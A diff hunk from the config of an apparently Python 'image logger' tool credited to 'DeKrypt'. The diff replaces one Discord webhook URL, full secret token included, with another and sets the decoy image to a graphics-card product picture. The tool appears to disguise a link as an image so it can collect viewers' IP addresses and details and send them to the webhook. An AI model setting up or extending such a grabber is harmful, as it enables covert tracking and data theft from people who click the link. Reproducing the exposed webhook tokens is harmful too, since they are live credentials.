@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1445799900523663581/RsG8LI97oPLu4PVWJWwF-C605fmFLwtXh43hZPqdJX3xPTYlRFE0C-VTD60JtlzYetnU"
-    "image": "https://al-taleed.com/vb/showthread.php?p=551561" # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1445803046255984835/4Hsht5Byk89L1ZEioXSKDkM8dzUtDlgCl6ogSTIIsuJDULu5IUNsBFepP4YbEPVtXZex"
+    "image": "https://www.google.com/imgres?q=%D9%83%D8%B1%D8%AA%205090&imgurl=https%3A%2F%2Fmedia.zid.store%2Fe4aadd21-62d3-4ecb-b286-5cfefed6d23c%2Fc07435fe-aa99-49ae-b0bc-8fc6f4711ba7.png&imgrefurl=https%3A%2F%2Fpcpalace.com.sa%2Fproducts%2FVGA-ASUS-90YV0LW0-M0NA00%3Fsrsltid%3DAfmBOoqNb2sgN_gDLgPlB6gisMVHfiBOV5A_Ptf9Kdts9Lsh52zYnOrL&docid=K9uhaySF-M5X-M&tbnid=gEUrYRxmuJEO0M&vet=12ahUKEwi_mOvV4aGRAxWJUMMIHRbvIc0QM3oECBoQAA..i&w=800&h=800&hcb=2&ved=2ahUKEwi_mOvV4aGRAxWJUMMIHRbvIc0QM3oECBoQAA" # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
